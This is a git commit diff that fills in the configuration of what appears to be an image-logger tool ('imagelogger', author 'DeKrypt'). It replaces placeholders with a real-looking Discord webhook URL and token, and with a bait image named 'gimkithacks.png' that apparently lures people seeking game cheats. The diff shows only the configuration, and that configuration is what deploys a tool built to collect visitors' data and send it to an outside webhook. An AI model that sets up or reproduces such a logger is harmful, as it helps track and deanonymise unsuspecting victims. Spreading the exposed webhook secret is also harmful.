7d221cfe63160116c6ca0407ce140a81a0bf76f5
Sk7tt1zz <154956876+htmlskid@users.noreply.github.com>
2025-02-02 00:07:36 -0800

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335521759213912084/dVBOkawQTqQhOmuLYktN9kNVG0KovEU2xVQrymAeeqQI7sFWTOX9kVv9wryJVNmkLB2t",
+    "image": "https://raw.githubusercontent.com/htmlskid/kjutkut/refs/heads/main/gimkithacks.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
